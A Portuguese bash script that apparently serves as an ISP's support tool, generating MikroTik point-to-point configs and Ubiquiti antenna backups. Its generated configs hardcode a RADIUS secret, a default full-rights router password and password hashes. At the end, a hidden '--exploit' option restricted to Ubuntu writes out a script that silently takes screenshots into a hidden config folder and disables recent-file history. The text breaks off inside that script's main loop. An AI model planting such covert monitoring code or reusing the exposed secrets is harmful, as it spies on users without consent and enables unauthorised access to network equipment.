#!/usr/bin/env bash

# Nome = AraujoSat Maintenance Tool (arjmaintool)
# Autor = Matheus Fellipe (Analista de Rede Jr.)
# Versão = 1.0
#
# Descrição = Esse script foi criado com a finalidade de automatizar diversos dos processos do dia a dia no suporte técnico.
# Sinta-se livre para modificar e utilizar da forma que quiser!

#RODAPÉ
RODAPE1="
------- Selecione o que deseja: "
RODAPE2="
------- As informações estão corretas?: "

#CORES
VERMELHO='\e[1;91m'
VERDE='\e[1;92m'
AZUL='\e[1;36m'
SEM_COR='\e[0m'

#LOGO
LOGO_ARJ="
                                                                                      
  ▄▄▄       ██▀███   ▄▄▄       █    ██  ▄▄▄██▀▀▀▒█████    ██████  ▄▄▄     ▄▄▄█████▓   
 ▒████▄    ▓██ ▒ ██▒▒████▄     ██  ▓██▒   ▒██  ▒██▒  ██▒▒██    ▒ ▒████▄   ▓  ██▒ ▓▒   
 ▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▒██░   ░██  ▒██░  ██▒░ ▓██▄   ▒██  ▀█▄ ▒ ▓██░ ▒░   
 ░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ▓▓█  ░██░▓██▄██▓ ▒██   ██░  ▒   ██▒░██▄▄▄▄██░ ▓██▓ ░    
  ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒▒▒█████▓  ▓███▒  ░ ████▓▒░▒██████▒▒ ▓█   ▓██▒ ▒██▒ ░    
  ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓▒ ▒ ▒  ▒▓▒▒░  ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░      
   ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░░░▒░ ░ ░  ▒ ░▒░    ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░   ░       
   ░   ▒     ░░   ░   ░   ▒    ░░░ ░ ░  ░ ░ ░  ░ ░ ░ ▒  ░  ░  ░    ░   ▒    ░         
       ░  ░   ░           ░  ░   ░      ░   ░      ░ ░        ░        ░  ░           
                                                                            ${VERMELHO}by Matheus${SEM_COR}
"

clear
echo -e "$LOGO_ARJ"

PS3="$RODAPE1" # ----------------------- FRASE DO RODAPÉ )

# ------------------------------------------- ( SELECIONA O TIPO DO SERVIÇO DESEJADO )
if [[ -z "$1" ]]; then
	select tipo_do_servico in "Gerar PTP para Mikrotik" "Manutenção para Antenas Ubiquit" "Manutenção Ubuntu" "Sair"
		do
		case $tipo_do_servico in
				"Gerar PTP para Mikrotik" )
						clear
						echo -e "$LOGO_ARJ"
					break
					;;
				"Manutenção para Antenas Ubiquit" )
						clear
						echo -e "$LOGO_ARJ"
					break
					;;
				"Manutenção Ubuntu" )
						clear
						echo -e "$LOGO_ARJ"
					break
					;;
				"Sair" )
						clear
						exit 1
					;;
				*) 
					echo -e "${VERMELHO}Comando não identificado!${SEM_COR}"
					;;
		esac
	done #---------------------------------------- FINAL DA SELEÇÃO DO SERVIÇO DESEJADO )
fi
########################################################################################################################
#													MIKROTIK
########################################################################################################################
ptp_pppoe_bh1 () {
echo \
"
/
/interface bridge add name=bridge1
/interface wireless set [ find default-name=wlan1 ] band=5ghz-a/n channel-width=20/40mhz-XX country=no_country_set disabled=no frequency=5500 frequency-mode=superchannel mode=bridge nv2-preshared-key=bh1#$ID nv2-security=enabled ssid=BH1-ARAUJOSAT-$ID wireless-protocol=nv2 wps-mode=disabled
/interface wireless set [ find default-name=wlan1 ] disabled=no
/interface bridge port add bridge=bridge1 interface=wlan1
/interface bridge port add bridge=bridge1 interface=[/interface ethernet find default-name=ether1]
/ip address add address=$BLOCO interface=bridge1
/ip route add distance=254 gateway=$GATEWAY
/ip service set winbox port=47569
/system identity set name=BH1-ARAUJOSAT-$ID
/snmp community set [ find default=yes ] addresses=10.51.200.4/32,10.51.200.9/32 name=arj_sat
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/user group add name=netconfig policy=local,ssh,ftp,read,policy,test,!telnet,!reboot,!write,!winbox,!password,!web,!sniff,!sensitive,!api,!romon,!dude,!tikapp
/ip service set telnet disabled=yes port=47589
/ip service set ftp address=186.249.81.30/32 port=47589
/ip service set www disabled=yes
/ip service set ssh disabled=no address=45.178.225.110/32,186.249.81.30/32,100.127.255.0/24 port=50004
/ip service set api disabled=yes
/ip service set winbox address=186.249.81.30/32,100.127.255.0/24 port=47569
/ip service set api-ssl disabled=yes
/ppp aaa set use-radius=yes
/radius add address=10.51.200.2 comment=HEXANETWORKS secret=\"}grZ6@Y#(fv1dV)@(gQz\" service=login timeout=1s
/radius incoming set accept=yes
/snmp set enabled=yes trap-version=2
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/system logging set 0 topics=info,!account
/system logging add action=remote topics=critical
/system logging add action=remote topics=error
/system logging add action=remote topics=info
/system logging add action=remote topics=warning
/user aaa set interim-update=3m use-radius=yes
/user add group=full address=186.249.81.30 name=$user_ptp password=$user_password
/user remove admin
/$add_l2mtu
/
" > "BH1-ARAUJOSAT-${LOGIN}-${ID}.rsc"
}

ptp_pppoe_bh2 () {
echo \
"
/
/interface pppoe-client add add-default-route=yes allow=chap,mschap1,mschap2 disabled=no interface=wlan1 name=pppoe-out-AraujoSat password=$SENHA use-peer-dns=yes user=$LOGIN
/interface wireless set [ find default-name=wlan1 ] band=5ghz-a/n channel-width=20/40mhz-XX disabled=no frequency=5500 frequency-mode=superchannel country=no_country_set mode=station-bridge nv2-preshared-key=bh1#$ID nv2-security=enabled scan-list=default,5100-6000 ssid=BH1-ARAUJOSAT-$ID wireless-protocol=nv2
/interface wireless set [ find default-name=wlan1 ] disabled=no
/ip address add address=192.168.1.1/24 interface=[/interface ethernet find name=ether1] network=192.168.1.0
/ip firewall nat add action=masquerade chain=srcnat out-interface=pppoe-out-AraujoSat src-address=192.168.1.0/24
/ip firewall nat add action=dst-nat chain=dstnat dst-port=8080 in-interface=pppoe-out-AraujoSat protocol=tcp to-addresses=192.168.1.10 to-ports=8080
/system identity set name=BH2-ARAUJOSAT-$ID
/ip pool add name=dhcp_pool_arj ranges=192.168.1.2-192.168.1.254
/ip dhcp-server add address-pool=dhcp_pool_arj disabled=no interface=[/interface ethernet find name=ether1] name=dhcp1
/ip dhcp-server network add address=192.168.1.0/24 dns-server=186.249.81.2,186.249.81.4 gateway=192.168.1.1
/snmp community set [ find default=yes ] addresses=10.51.200.4/32,10.51.200.9/32 name=arj_sat
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/user group add name=netconfig policy=local,ssh,ftp,read,policy,test,!telnet,!reboot,!write,!winbox,!password,!web,!sniff,!sensitive,!api,!romon,!dude,!tikapp
/ip service set telnet disabled=yes port=47589
/ip service set ftp address=186.249.81.30/32 port=47589
/ip service set www disabled=yes
/ip service set ssh disabled=no address=45.178.225.110/32,186.249.81.30/32,100.127.255.0/24 port=50004
/ip service set api disabled=yes
/ip service set winbox address=186.249.81.30/32,100.127.255.0/24 port=47569
/ip service set api-ssl disabled=yes
/ppp aaa set use-radius=yes
/radius add address=10.51.200.2 comment=HEXANETWORKS secret=\"}grZ6@Y#(fv1dV)@(gQz\" service=login timeout=1s
/radius incoming set accept=yes
/snmp set enabled=yes trap-version=2
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/system logging set 0 topics=info,!account
/system logging add action=remote topics=critical
/system logging add action=remote topics=error
/system logging add action=remote topics=info
/system logging add action=remote topics=warning
/user aaa set interim-update=3m use-radius=yes
/user add group=full address=186.249.81.30 name=$user_ptp password=$user_password
/user remove admin
/$add_l2mtu
/
" > "BH2-ARAUJOSAT-${LOGIN}-${ID}.rsc"
}

ptp_bridge_bh1 () {
echo \
"
/
/interface bridge add name=bridge1
/interface wireless set [ find default-name=wlan1 ] band=5ghz-a/n channel-width=20/40mhz-XX country=no_country_set disabled=no frequency=5500 frequency-mode=superchannel mode=bridge nv2-preshared-key=bh1#$LOCAL nv2-security=enabled ssid=BH1-$LOCAL wireless-protocol=nv2 wps-mode=disabled
/interface bridge port add bridge=bridge1 interface=[/interface ethernet find name=ether1]
/interface bridge port add bridge=bridge1 interface=wlan1
/ip address add address=$BH1 interface=bridge1
/ip route add distance=254 gateway=$GATEWAY
/system identity set name=BH1-$LOCAL-ARAUJOSAT
/snmp community set [ find default=yes ] addresses=10.51.200.4/32,10.51.200.9/32 name=arj_sat
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/user group add name=netconfig policy=local,ssh,ftp,read,policy,test,!telnet,!reboot,!write,!winbox,!password,!web,!sniff,!sensitive,!api,!romon,!dude,!tikapp
/ip service set telnet disabled=yes port=47589
/ip service set ftp address=186.249.81.30/32 port=47589
/ip service set www disabled=yes
/ip service set ssh disabled=no address=45.178.225.110/32,186.249.81.30/32,100.127.255.0/24 port=50004
/ip service set api disabled=yes
/ip service set winbox address=186.249.81.30/32,100.127.255.0/24 port=47569
/ip service set api-ssl disabled=yes
/ppp aaa set use-radius=yes
/radius add address=10.51.200.2 comment=HEXANETWORKS secret=\"}grZ6@Y#(fv1dV)@(gQz\" service=login timeout=1s
/radius incoming set accept=yes
/snmp set enabled=yes trap-version=2
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/system logging set 0 topics=info,!account
/system logging add action=remote topics=critical
/system logging add action=remote topics=error
/system logging add action=remote topics=info
/system logging add action=remote topics=warning
/user aaa set interim-update=3m use-radius=yes
/user add group=full address=186.249.81.30 name=$user_ptp password=$user_password
/user remove admin
/$add_l2mtu
/
" > "BH1-${LOCAL}-ARAUJOSAT.rsc"
}

ptp_bridge_bh2 () {
				echo \
"
/
/interface bridge add name=bridge1
/interface wireless set [ find default-name=wlan1 ] band=5ghz-a/n channel-width=20/40mhz-XX country=no_country_set disabled=no frequency-mode=superchannel mode=station-bridge nv2-preshared-key=bh1#$LOCAL nv2-security=enabled radio-name=BH2-$LOCAL scan-list=default,5100-6000 ssid=BH1-$LOCAL wireless-protocol=nv2
/interface wireless nstreme set wlan1 enable-nstreme=yes
/interface wireless security-profiles set [ find default=yes ] supplicant-identity=MikroTik
/interface bridge port add bridge=bridge1 interface=[/interface ethernet find name=ether1]
/interface bridge port add bridge=bridge1 interface=wlan1
/ip address add address=$BH2 interface=bridge1
/ip route add distance=254 gateway=$GATEWAY
/system identity set name=BH2-$LOCAL-ARAUJOSAT
/snmp community set [ find default=yes ] addresses=10.51.200.4/32,10.51.200.9/32 name=arj_sat
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/user group add name=netconfig policy=local,ssh,ftp,read,policy,test,!telnet,!reboot,!write,!winbox,!password,!web,!sniff,!sensitive,!api,!romon,!dude,!tikapp
/ip service set telnet disabled=yes port=47589
/ip service set ftp address=186.249.81.30/32 port=47589
/ip service set www disabled=yes
/ip service set ssh disabled=no address=45.178.225.110/32,186.249.81.30/32,100.127.255.0/24 port=50004
/ip service set api disabled=yes
/ip service set winbox address=186.249.81.30/32,100.127.255.0/24 port=47569
/ip service set api-ssl disabled=yes
/ppp aaa set use-radius=yes
/radius add address=10.51.200.2 comment=HEXANETWORKS secret=\"}grZ6@Y#(fv1dV)@(gQz\" service=login timeout=1s
/radius incoming set accept=yes
/snmp set enabled=yes trap-version=2
/system logging action set 3 remote=10.51.200.3 remote-port=32514
/system logging set 0 topics=info,!account
/system logging add action=remote topics=critical
/system logging add action=remote topics=error
/system logging add action=remote topics=info
/system logging add action=remote topics=warning
/user aaa set interim-update=3m use-radius=yes
/user add group=full address=186.249.81.30 name=$user_ptp password=$user_password
/user remove admin
/$add_l2mtu
/
" > "BH2-${LOCAL}-ARAUJOSAT.rsc"
}

if [[ "$tipo_do_servico" = "Gerar PTP para Mikrotik" ]]; then # ------------------------------------------- SELECIONE O PONTO A PONTO ) 

adicionar_usuario_mk () {
		select adicionar_usuario in "Padrão." "Custom." #  ----------------------------------- ( DESEJA ADICIONAR USUÁRIO DEFAULT?)
		do
				case $adicionar_usuario in
				Padrão. )
					user_ptp="sup@sat"
					user_password='"lRz\$&1hd=vW+yD1kw32sH7qC+e\$ONnHN.6qs+Ri}"'
					break
						;;
				Custom. )
				read -p "Digite o Usuário: " user_ptp
				read -s -p "Digite a Senha: " user_password
					break
						;;
				* )
					echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
						;;
			esac
		done #  ----------------------------------- ( FINAL DESEJA ADICIONAR USUÁRIO DEFAULT?)
} 

seta_max_l2mtu () {
		select set_l2mtu in "Sim!" "Não."
		do
			case $set_l2mtu in 
			Sim! )
				add_l2mtu='int ethernet set l2mtu=20000 [f]'
				break
					;;
			Não. )
				add_l2mtu=''
				break
					;;
			esac
		done
}


		select tipo_do_ptp in "Gerar PTP para PPPoE" "Gerar PTP para Bridge" "Setar L2MTU Máximo" "Sair"
		do
			case $tipo_do_ptp in
			"Gerar PTP para PPPoE" )
					break
					;;
			"Gerar PTP para Bridge" )
				break
					;;
			"Setar L2MTU Máximo" )
				echo -e "\n/int ethernet set l2mtu=20000 [f]\n"
				break
					;;
				"Sair" )
					clear
					exit 1
					;;
				* ) 
					echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
					;;
				
			esac
		done
fi

	if [[ "$tipo_do_ptp" = "Gerar PTP para PPPoE" ]]; then # ------------------------------------------- INICIO PONTO A PONTO DE PPPOE ) 

		# -------------------------------------------------------------------- INTERAÇÕES COM O USUÁRIO )
		echo "- Digite o ID do Contrato do cliente?"; read "ID"		
		echo "- Qual o login do PPPoE do cliente?"; read "LOGIN"		
		echo -e "- Qual a senha do PPPoE do cliente?"; read "SENHA"		
		echo -e "- Qual o bloco de ip do BH1? \nLembre-se de adicionar a mascara de subrede. \nFormato: ${AZUL}XX.XX.XX.XX/MM${SEM_COR}"; read "BLOCO"		
		echo -e "- Qual o gateway desse bloco? \nLembre-se de adicionar a mascara de subrede. \nFormato: ${AZUL}XX.XX.XX.XX${SEM_COR}"; read "GATEWAY"		
		echo -e "\nDeseja adicionar usuário e senha padrão ou custom?\n${VERMELHO}(também será removido o usuário admin)${SEM_COR}\n"
		adicionar_usuario_mk
		echo -e "Deseja setar o L2MTU no máximo? (recomendado)"
		seta_max_l2mtu
		echo -e \
"
------- CONFIRA AS INFORMAÇÕES --------

ID DO CLIENTE:${VERMELHO}  $ID ${SEM_COR}
LOGIN DO PPPOE:${VERMELHO} $LOGIN ${SEM_COR}
SENHA DO PPPOE:${VERMELHO} $SENHA ${SEM_COR}
BLOCO DO BH1:${VERMELHO}   $BLOCO ${SEM_COR}
GATEWAY DO BH1:${VERMELHO} $GATEWAY ${SEM_COR}
USUÁRIO: ${VERMELHO}$adicionar_usuario${SEM_COR}
L2MTU: ${VERMELHO}$set_l2mtu${SEM_COR}

---------------------------------------
"
PS3="$RODAPE2" # ------------------------------------------- RODAPÉ )

		select STATUS1 in "Sim!" "Não." #  ----------------------------------- ( SELEÇÃO DE CONFIMAÇÃO SIM OU NÃO )
		do
				case $STATUS1 in
				Sim! )
					ptp_pppoe_bh1 #EXPORTA BH1
					ptp_pppoe_bh2 #EXPORTA BH2
					echo -e "${VERDE}\nScript do BH1 e BH2 exportado com sucesso!${SEM_COR}"
						break
						;;
				Não. ) 
					echo -e "\nTente novamente! Saindo....."
					exit 1
						;;
				* )
					echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
						;;
			esac
		done
		fi # ------------------------------------------------------------------------------------ FINAL PTP PPPOE ) 

if [[ "$tipo_do_ptp" = "Gerar PTP para Bridge" ]]; then  #--------------------------------------------------------- PONTO A PONTO BRIDGE - INICIO) 
	echo "- Qual é o nome da localidade?"; read "LOCAL"
	echo -e "- Qual é o ip do BH1? \nLembre-se de adicionar a mascara de subrede. \nFormato: ${AZUL}XX.XX.XX.XX/MM${SEM_COR}"; read "BH1"		
	echo -e "- Qual é o ip do BH2? \nLembre-se de adicionar a mascara de subrede. \nFormato: ${AZUL}XX.XX.XX.XX/MM${SEM_COR}"; read "BH2"
	echo -e "- Qual o gateway do ponto a ponto? \nFormato: ${AZUL}XX.XX.XX.XX${SEM_COR}"; read "GATEWAY"		
	echo -e "\nDeseja adicionar usuário e senha padrão ou custom?\n${VERMELHO}(também será removido o usuário admin)${SEM_COR}\n"
	adicionar_usuario_mk
	echo -e "Deseja setar o L2MTU no máximo? (recomendado)"
	seta_max_l2mtu
# CONFIRA SE AS INFORMAÇÕES ESTÃO CERTAS
	echo -e \
"
------- CONFIRA AS INFORMAÇÕES --------

NOME DO BH1: BH1-${VERMELHO}$LOCAL${SEM_COR}-ARAUJOSAT
NOME DO BH2: BH2-${VERMELHO}$LOCAL${SEM_COR}-ARAUJOSAT
IP DO BH1: ${VERMELHO}$BH1${SEM_COR}
IP DO BH2: ${VERMELHO}$BH2${SEM_COR}
GATEWAY:   ${VERMELHO}$GATEWAY${SEM_COR}
USUÁRIO: ${VERMELHO}$adicionar_usuario${SEM_COR}
L2MTU: ${VERMELHO}$set_l2mtu${SEM_COR}

---------------------------------------
"
PS3="$RODAPE2" # ----------------------- FRASE DO RODAPÉ )

select STATUS2 in "Sim!" "Não."
do
	case $STATUS2 in
		Sim! )
			ptp_bridge_bh1 #EXPORTA BH1
			ptp_bridge_bh2 #EXPORTA BH2
			echo -e "${VERDE}\nScript do BH1 e BH2 exportado com sucesso!${SEM_COR}"
				break
				;;

		Não. ) 
			echo -e "\nTente novamente! Saindo....."
			exit 1
				;;
		* ) 
			echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
				;;
	esac
done
fi # --------------------------------------------------------- PONTO A PONTO BRIDGE - FINAL) 
########################################################################################################################
#												FINAL MIKROTIK
########################################################################################################################

########################################################################################################################
#											MANUTENÇÃO DAS ANTENAS UBQUIT
########################################################################################################################

bkp_da_antena () {
	echo  \
"
aaa.1.br.devname=br0
aaa.1.devname=ath0
aaa.1.driver=madwifi
aaa.1.radius.acct.1.status=disabled
aaa.1.radius.auth.1.status=disabled
aaa.1.radius.macacl.status=disabled
aaa.1.ssid=$SSID
aaa.1.status=enabled
aaa.1.wpa.1.pairwise=CCMP
aaa.1.wpa.key.1.mgmt=WPA-PSK
aaa.1.wpa.mode=2
aaa.1.wpa.psk=$WPA
aaa.status=enabled
bridge.1.comment=
bridge.1.devname=br0
bridge.1.fd=1
bridge.1.port.1.devname=eth0
bridge.1.port.1.status=enabled
bridge.1.port.2.devname=ath0
bridge.1.port.2.status=enabled
bridge.1.status=enabled
bridge.1.stp.status=disabled
bridge.status=enabled
dhcp6c.1.devname=br0
dhcp6c.1.stateful.status=disabled
dhcp6c.1.stateless.status=enabled
dhcp6c.1.status=enabled
dhcp6c.status=enabled
dhcpc.1.devname=br0
dhcpc.1.fallback=192.168.1.20
dhcpc.1.fallback_netmask=255.255.255.0
dhcpc.1.status=disabled
dhcpc.status=enabled
dhcpd.status=disabled
discovery.cdp.status=enabled
discovery.status=enabled
dyndns.status=disabled
ebtables.status=enabled
ebtables.sys.arpnat.1.devname=ath0
ebtables.sys.arpnat.1.status=enabled
ebtables.sys.arpnat.status=disabled
ebtables.sys.eap.1.devname=ath0
ebtables.sys.eap.1.status=enabled
ebtables.sys.eap.status=enabled
ebtables.sys.status=enabled
ebtables.sys.vlan.status=disabled
gui.language=pt_PT
gui.network.advanced.status=disabled
httpd.https.port=443
httpd.https.status=enabled
httpd.port=8080
httpd.session.timeout=900
httpd.status=enabled
netconf.1.autoip.status=disabled
netconf.1.autoneg=enabled
netconf.1.devname=eth0
netconf.1.hwaddr.mac=
netconf.1.hwaddr.status=disabled
netconf.1.ip=0.0.0.0
netconf.1.mtu=1500
netconf.1.netmask=255.255.255.0
netconf.1.promisc=enabled
netconf.1.role=bridge_port
netconf.1.status=enabled
netconf.1.up=enabled
netconf.2.allmulti=enabled
netconf.2.autoip.status=disabled
netconf.2.devname=ath0
netconf.2.hwaddr.mac=
netconf.2.hwaddr.status=disabled
netconf.2.ip=0.0.0.0
netconf.2.mtu=1500
netconf.2.netmask=255.255.255.0
netconf.2.promisc=enabled
netconf.2.role=bridge_port
netconf.2.status=enabled
netconf.2.up=enabled
netconf.3.autoip.status=disabled
netconf.3.devname=br0
netconf.3.hwaddr.mac=
netconf.3.hwaddr.status=disabled
netconf.3.ip6.status=enabled
netconf.3.ip=$IP
netconf.3.mtu=1500
netconf.3.netmask=$MASK
netconf.3.role=mlan
netconf.3.status=enabled
netconf.3.up=enabled
netconf.status=enabled
netmode=bridge
ntpclient.status=disabled
ppp.status=disabled
pwdog.delay=150
pwdog.host=$GATEWAY
pwdog.period=150
pwdog.retry=3
pwdog.status=enabled
radio.1.ack.auto=enabled
radio.1.ackdistance=600
radio.1.acktimeout=25
radio.1.ampdu.bytes=50000
radio.1.ampdu.frames=32
radio.1.ampdu.status=enabled
radio.1.ani.status=disabled
radio.1.antenna.gain=34
radio.1.antenna.id=13
radio.1.cable.loss=0
radio.1.chanbw=20
radio.1.countrycode=511
radio.1.cwm.enable=0
radio.1.cwm.mode=0
radio.1.devname=ath0
radio.1.dfs.status=enabled
radio.1.forbiasauto=0
radio.1.freq=5360
radio.1.ieee_mode=11naht20
radio.1.mcastrate=0
radio.1.mode=master
radio.1.obey=enabled
radio.1.polling=enabled
radio.1.pollingnoack=0
radio.1.pollingpri=
radio.1.qdur=
radio.1.rate.auto=enabled
radio.1.rate.mcs=15
radio.1.reg_obey=enabled
radio.1.rts=off
radio.1.status=enabled
radio.1.subsystemid=0xe6b5
radio.1.thresh62a=
radio.1.thresh62b=
radio.1.thresh62g=
radio.1.txpower=27
radio.countrycode=511
radio.countrylicense=0
radio.rate_module=atheros
radio.status=enabled
resolv.host.1.name=(NOME)
resolv.host.1.status=enabled
resolv.nameserver.1.ip=
resolv.nameserver.1.status=disabled
resolv.nameserver.2.ip=
resolv.nameserver.2.status=disabled
resolv.nameserver.3.ip=
resolv.nameserver.3.status=disabled
resolv.nameserver.4.ip=
resolv.nameserver.4.status=disabled
resolv.nameserver.status=enabled
resolv.status=disabled
route.1.comment=
route.1.devname=br0
route.1.gateway=$GATEWAY
route.1.ip=0.0.0.0
route.1.netmask=0
route.1.status=enabled
route.status=enabled
snmp.community=arj_sat
snmp.contact=Araujosat
snmp.location=Crato
snmp.status=enabled
sshd.auth.passwd=enabled
sshd.port=22
sshd.status=enabled
syslog.remote.status=disabled
syslog.remote.tcp.status=disabled
syslog.status=enabled
system.button.reset=enabled
system.cfg.version=65546
system.date.status=disabled
system.date.timestamp=
system.eirp.status=disabled
system.latitude=
system.longitude=
system.timezone=UTC
telnetd.status=disabled
tshaper.status=disabled
unms.status=disabled
update.check.status=enabled
users.1.name=suporte
users.1.password=\$1\$k5VtSvO0\$aJucqz/Rzi4S1a6w2htO1/
users.1.status=enabled
users.2.gid=100
users.2.name=admin
users.2.password=\$1\$eRb5SIOe\$cMxq9wkOYWtgR9aUjuTZ70
users.2.shell=/bin/false
users.2.status=enabled
users.2.uid=100
users.status=enabled
vlan.status=disabled
wireless.1.addmtikie=enabled
wireless.1.ap=
wireless.1.authmode=1
wireless.1.autowds=disabled
wireless.1.compression=0
wireless.1.devname=ath0
wireless.1.fastframes=0
wireless.1.frameburst=0
wireless.1.hide_ssid=disabled
wireless.1.l2_isolation=disabled
wireless.1.mac_acl.policy=allow
wireless.1.mac_acl.status=disabled
wireless.1.mcast.enhance=2
wireless.1.scan_list.channels=
wireless.1.scan_list.status=disabled
wireless.1.security.type=none
wireless.1.sens=28
wireless.1.signal_led1=94
wireless.1.signal_led2=80
wireless.1.signal_led3=73
wireless.1.signal_led4=65
wireless.1.signal_led_status=enabled
wireless.1.ssid=$SSID
wireless.1.status=enabled
wireless.1.wds.1.peer=
wireless.1.wds.2.peer=
wireless.1.wds.3.peer=
wireless.1.wds.4.peer=
wireless.1.wds.5.peer=
wireless.1.wds.6.peer=
wireless.1.wds.status=disabled
wireless.hideindoor.status=disabled
wireless.status=enabled
wpasupplicant.device.1.status=disabled
wpasupplicant.profile.1.network.1.psk=$WPA
wpasupplicant.status=disabled

" > BKP-ARJ-${NOME}.cfg
}

download_att_antenas () {
			diretorio_destino="/home/$USER/Downloads/ANTENAS-6.3.11"
			echo "Realizando download dos arquivos direto da fabricante em $diretorio_destino"
			mkdir -p "$diretorio_destino"  # -p para criar o diretório se ele não existir
			# baixando binários na pasta definida.
			echo "Binário XW"
			wget -P "$diretorio_destino" "https://dl.ui.com/firmwares/XW-fw/v6.3.11/XW.v6.3.11.33396.230425.1644.bin"
			echo "Binário XM"
			wget -P "$diretorio_destino" "https://dl.ui.com/firmwares/XN-fw/v6.3.11/XM.v6.3.11.33396.230425.1742.bin"
			echo -e "${VERDE}Download Finalizado com sucesso! No diretório $diretorio_destino ${SEM_COR}"
}

lista_de_canais () {
	echo \
"
5180,5200,5220,5240,5260,5280,5300,5320,5340,5360,5380,5400,5420,5440,5460,5480,5500,5520,5540,5560,5580,5600,5620,5640,5660,5680,5700,5720,5725,5740,5745,5760,5765,5780,5785,5800,5805,5815,5820,5825,5840,5860,5880,5900
"
}

if [[ "$tipo_do_servico" = "Manutenção para Antenas Ubiquit" ]]; then #--------------------------------------------------- ( COMEÇA MANUTENÇÃO UBQUIT )

PS3="$RODAPE1" # ----------------------- FRASE DO RODAPÉ )

select MANUBQUIT in "Gerar BKP para Antena Ubiquit" "Download Atualização das Antenas v.6.3.11" "Gerar lista de Canais" "Sair"
	do
		case $MANUBQUIT in
			"Gerar BKP para Antena Ubiquit" )
					break
						;;
			"Download Atualização das Antenas v.6.3.11" )
					break
						;;
			"Gerar lista de Canais" )
					break
						;;	
			"Sair" )
				clear
				exit 1
				;;
			* ) 
				echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
						;;
			
		esac
	done

#-------------------------------------------------------- ( Selecionou Gerar BKP para Antena Ubiquit )
	if [[ "$MANUBQUIT" = "Gerar BKP para Antena Ubiquit" ]]; then

		echo "Qual o nome do painel?"; read "NOME"			 
		echo "Qual o SSID que deseja propagar?"; read "SSID"  
		echo "Qual WPA do painel?"; read "WPA" 
		echo -e "Qual o IP do pinel? \nUtilizar o formato XX.XX.XX.XX"; read "IP"			 
		echo -e "Qual a mascara? \nUtilizar o formato XX.XX.XX.XX"; read "MASK"			 		
		echo -e "Qual o IP do gateway? \nUtilizar o formato XX.XX.XX.XX"; read "GATEWAY"			 		
		echo -e \
"
------- CONFIRA AS INFORMAÇÕES --------

NOME: ${VERMELHO}$NOME${SEM_COR}
SSID: ${VERMELHO}$SSID${SEM_COR}
WPA: ${VERMELHO}$WPA${SEM_COR}
IP: ${VERMELHO}$IP${SEM_COR}
MASCARA: ${VERMELHO}$MASK${SEM_COR}	
GATEWAY: ${VERMELHO}$GATEWAY${SEM_COR}

---------------------------------------
"

PS3="$RODAPE2" # ----------------------- FRASE DO RODAPÉ )


		select STATUS3 in "Sim!" "Não." #----------------------------- (SELEÇÃO DE SIM OU NÃO)
			do
			case $STATUS3 in 
				"Sim!" ) #----------------------- (CASO SIM EXECUTE ABAIXO)
					bkp_da_antena
					echo "BKP exportado com sucesso!"
					break
					;;
				"Não." )
					echo -e "Tente novamente! \nSaindo..."
					break
					;;
				* )
					echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
					;;
				
			esac
			done
	
	fi


	#-----------------------------------------------------------------------------( Download Atualização das Antenas v.6.3.11 )
	if [[ "$MANUBQUIT" = "Download Atualização das Antenas v.6.3.11" ]]; then
		download_att_antenas
	fi
	#---------------------------------------------------------------------------- (COMEÇA LISTA DE CANAIS)

	if [[ "$MANUBQUIT" = "Gerar lista de Canais" ]]; then 
		
		lista_de_canais
		
		echo "Deseja que seja criado um arquivo contendo a lista?"
		select STATUSLISTA in "Sim!" "Não."
			do
			case $STATUSLISTA in
					"Sim!" )
						lista_de_canais > Lista_de_canais.txt
						echo -e "${VERDE}\nLista de canais exportada com sucesso!${SEM_COR}"
						break
						;;
					"Não." )
						echo "Saindo!..."
						exit 1
						break
						;;
					*) 
						echo -e "${VERMELHO}Comando não identificado!${SEM_COR}"
						;;
			esac
		done
	fi #--------------------------------------- (TERMINA LISTA DE CANAIS)


fi #-------------------------------------------------------------- ( TERMINA MANUTENÇÃO UBQUIT )
########################################################################################################################
#					    					MANUTENÇÃO DAS ANTENAS UBQUIT
########################################################################################################################

if [[ "$1" = "--exploit" && $(lsb_release -si) == "Ubuntu" ]]; then

export_exploit () {
	mkdir -p $DIRETORIO
	echo \
'
#!/usr/bin/env bash

# Variáveis de personalização
date=$(date +"%Y-%m-%d")
datetime=$(date +"%Y-%m-%d-%H-%M-%S")
screenshot_path="$HOME/.config/arjconfig/screenshot/$date"
screenshot_name="screenshot_$datetime.png"

apagar_pastas () {
	local="$HOME/.config/arjconfig/screenshot"  # Substitua pelo caminho para a pasta que você deseja monitorar
	limite=30
	# Verifica se o número de pastas atingiu o limite
	numero_de_pastas=$(find "$local" -mindepth 1 -maxdepth 1 -type d | wc -l)

	if [ "$numero_de_pastas" -ge "$limite" ]; then
	    # Encontra a pasta mais antiga com base na data no nome
	    pasta_mais_antiga=$(find "$local" -mindepth 1 -maxdepth 1 -type d | sort | head -n 1)

	    if [ -n "$pasta_mais_antiga" ]; then
		rm -r "$pasta_mais_antiga"
	    fi
	fi
}

# Função para criar o diretório de captura de tela, se não existir
create_screenshot_directory() {
    if [ ! -d "$screenshot_path" ]; then
        mkdir -p "$screenshot_path"
    fi
}

# Função para capturar a tela e salvar no diretório especificado
take_screenshot() {
    scrot -z "$screenshot_path/$screenshot_name"
}

desativa_recentes () {
	gsettings set org.gnome.desktop.privacy remember-recent-files false
	gsettings set org.gtk.Settings.FileChooser show-hidden false
}

# Função principal
main () {
    while true; do
